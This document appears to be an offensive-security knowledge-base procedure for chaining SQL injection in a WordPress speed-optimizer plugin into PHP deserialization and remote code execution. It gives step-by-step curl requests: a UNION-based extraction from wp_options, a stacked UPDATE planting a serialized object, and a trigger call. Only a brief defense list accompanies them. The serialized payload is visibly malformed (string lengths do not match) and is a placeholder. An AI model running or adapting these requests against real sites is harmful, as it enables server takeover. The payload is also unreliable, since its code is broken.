---
id: procedure-uuid-2
name: Chain-SQL-Injection-to-Insecure-Deserialization-for-RCE
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.539Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploitation of Remote Services]]'
sub_techniques: []
tags:
  - rce
  - deserialization
  - wordpress
  - chaining
commands:
  - '[[commands/curl-deserialization-payload]]'
platforms:
  - Web
  - WordPress
  - PHP
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation of Remote Services]]'
---

# Chain-SQL-Injection-to-Insecure-Deserialization-for-RCE

## Summary

This procedure chains the SQL injection vulnerability in the TenWeb Speed Optimizer plugin to an insecure deserialization flaw, allowing attackers to inject malicious serialized PHP objects into the database, which are then unserialized by the plugin to execute arbitrary code on the server.

## Description

After gaining SQL access, the attacker manipulates serialized data stored in WordPress options or plugin tables. The plugin's lack of validation during unserialization permits gadget chains in PHP objects to invoke functions like system() or eval(). This targets PHP environments in WordPress, leading to full RCE. Prerequisites include successful SQLi from the prior procedure.

## Requirements

1. Successful SQL injection access from previous step
2. Knowledge of vulnerable serialized fields (e.g., wp_options table)
3. PHP gadget chain for deserialization (e.g., using ysoserial.php equivalent)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all deserialized data
- Use safe unserialization alternatives like JSON
- Monitor for unexpected PHP object instantiation in logs

## Objectives

1. Inject malicious serialized payload via SQLi
2. Trigger deserialization to execute code
3. Achieve RCE such as command execution

## Instructions

### Step 1: Identify Vulnerable Serialized Field

**Context**: Use SQLi to query for serialized data locations.

**Command** ([[commands/curl-deserialization-payload]]):
```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'id=1\' UNION SELECT 1,option_value,3 FROM wp_options WHERE option_name LIKE '%tenweb%'--' -H 'Content-Type: application/x-www-form-urlencoded'
```

> Extract serialized strings from the response to identify targets.

### Step 2: Inject Malicious Payload

**Context**: Update the field with a deserialization gadget chain for RCE.

**Command** ([[commands/curl-deserialization-payload]]):
```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'id=1\' ; UPDATE wp_options SET option_value=\'O:21:"PHP\u0000Object":1:{s:6:"_data";s:7:"system";}\' WHERE option_name="vulnerable_option"--' -H 'Content-Type: application/x-www-form-urlencoded'
```

> This injects a basic gadget; adjust for actual chain. Trigger by calling plugin function.

### Step 3: Trigger and Execute

**Context**: Access endpoint or admin to unserialize and execute.

**Command** ([[commands/curl-deserialization-payload]]):
```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'trigger=1' -H 'Content-Type: application/x-www-form-urlencoded'
```

> Expected: Code execution, e.g., output from system('id').

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation of Remote Services]]

### Sub-Techniques


## Commands Used

- [[commands/curl-deserialization-payload]]

## Tools Used


## Tags

- rce
- deserialization
